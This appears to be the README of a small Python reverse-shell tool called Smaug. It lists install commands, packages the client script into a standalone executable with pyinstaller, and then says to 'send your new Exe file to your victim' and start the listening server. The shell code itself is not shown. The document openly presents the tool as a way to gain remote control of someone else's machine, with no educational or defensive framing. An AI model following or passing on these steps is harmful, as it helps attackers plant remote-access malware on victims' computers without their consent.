# Smaug
Smaug is a simple in python written Reverse Shell

---

![demo](/images/demo.png)

## Installation

You need python installed to use this application

1. Install Requirements
```
python3 -m pip install -r requirements.txt
```

2. Create exe from client.pyw
```
python3 -m pip install auto-py-to-exe
pyinstaller --noconfirm --onefile --console "./client.pyw"
```

3. Send Your new Exe file to your victim and Start the server
```
cd server
python3 server.py
```
